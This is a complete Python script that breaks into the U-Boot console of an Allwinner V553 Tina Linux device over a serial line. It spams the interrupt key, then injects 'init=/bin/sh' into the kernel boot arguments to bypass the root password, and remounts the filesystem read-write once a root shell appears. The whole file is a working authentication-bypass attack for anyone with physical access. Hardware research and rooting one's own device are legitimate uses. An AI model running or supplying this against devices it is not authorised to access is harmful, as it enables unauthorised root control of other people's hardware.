#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Interactive U-Boot Autoboot Breaker for Allwinner V553 (Tina Linux)
全志 V553 U-Boot 交互式自动拦截器
"""

import sys
import os
import termios
import select
import time

PORT = "/dev/ttyUSB0"
BAUD = 115200

def set_raw(fd):
    attrs = termios.tcgetattr(fd)
    attrs[4] = attrs[5] = termios.B115200
    attrs[0] = 0
    attrs[1] = 0
    attrs[2] = termios.CS8 | termios.CREAD | termios.CLOCAL
    attrs[3] = 0
    termios.tcsetattr(fd, termios.TCSANOW, attrs)
    termios.tcflush(fd, termios.TCIOFLUSH)

def main():
    if not os.path.exists(PORT):
        print(f"[-] Error: {PORT} not found.")
        sys.exit(1)

    fd = os.open(PORT, os.O_RDWR | os.O_NOCTTY | os.O_NONBLOCK)
    set_raw(fd)

    print("=" * 65)
    print(" [*] Allwinner V553 U-Boot Breaker (Tina Linux)")
    print(" [*] 全志 V553 U-Boot 自动拦截控制台")
    print(" [*] 正在高频发送空格以拦截 bootdelay=0...")
    print(" [*] 请确保已【彻底断电至少 5 秒】，然后【插上 Type-C 电源】！")
    print("=" * 65)
    sys.stdout.flush()

    log_f = open("uboot_success.log", "ab")
    start_time = time.time()
    interrupted = False
    rx_buf = b""
    c_idx = 0
    chars = [b" "] # Space is standard U-Boot interrupt key

    # Run for up to 90 seconds
    while time.time() - start_time < 90:
        # Check for RX
        rlist, _, _ = select.select([fd], [], [], 0.01)
        if rlist:
            data = os.read(fd, 2048)
            if data:
                log_f.write(data)
                log_f.flush()
                rx_buf += data
                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()

                # Check if we caught U-Boot prompt
                if b"=>" in rx_buf[-20:] or b"sunxi#" in rx_buf[-20:] or b"uboot#" in rx_buf[-20:]:
                    interrupted = True
                    break

        # High-speed spacebar spamming (every 10ms)
        if not interrupted:
            try:
                os.write(fd, chars[c_idx % len(chars)])
                c_idx += 1
            except Exception:
                pass

    if interrupted:
        print("\n\n" + "=" * 65)
        print(" [!!!] SUCCESS! U-BOOT PROMPT INTERRUPTED! / 拦截成功！已进入 U-Boot！")
        print(" [*] Entering interactive shell... Type commands (e.g. printenv).")
        print("=" * 65 + "\n")
        sys.stdout.flush()

        # Send printenv to display boot configuration
        time.sleep(0.1)
        os.write(fd, b"\r\nprintenv bootargs bootcmd\r\n")
        
        # Read response for 2 seconds
        end_t = time.time() + 2.0
        while time.time() < end_t:
            rlist, _, _ = select.select([fd], [], [], 0.1)
            if rlist:
                data = os.read(fd, 2048)
                if data:
                    log_f.write(data)
                    log_f.flush()
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()

        # Now bypass root password by setting init=/bin/sh!
        print("\n[*] Sending payload to bypass root password (init=/bin/sh)...")
        # Read current bootargs
        os.write(fd, b"setenv bootargs \"${bootargs} init=/bin/sh\"\r\n")
        time.sleep(0.2)
        os.write(fd, b"boot\r\n")
        
        # Capture shell bootup
        end_t = time.time() + 8.0
        while time.time() < end_t:
            rlist, _, _ = select.select([fd], [], [], 0.1)
            if rlist:
                data = os.read(fd, 2048)
                if data:
                    log_f.write(data)
                    log_f.flush()
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                    if b"/ #" in data or b"/bin/sh" in data or b"#" in data:
                        print("\n[!!!] ROOT SHELL OBTAINED! / 成功获取免密 ROOT SHELL！")
                        os.write(fd, b"\r\nid; cat /proc/partitions; mount -o remount,rw /\r\n")
                        break

    else:
        print(f"\n[-] Timeout. Logged {len(rx_buf)} bytes.")

    log_f.close()
    os.close(fd)

if __name__ == "__main__":
    main()
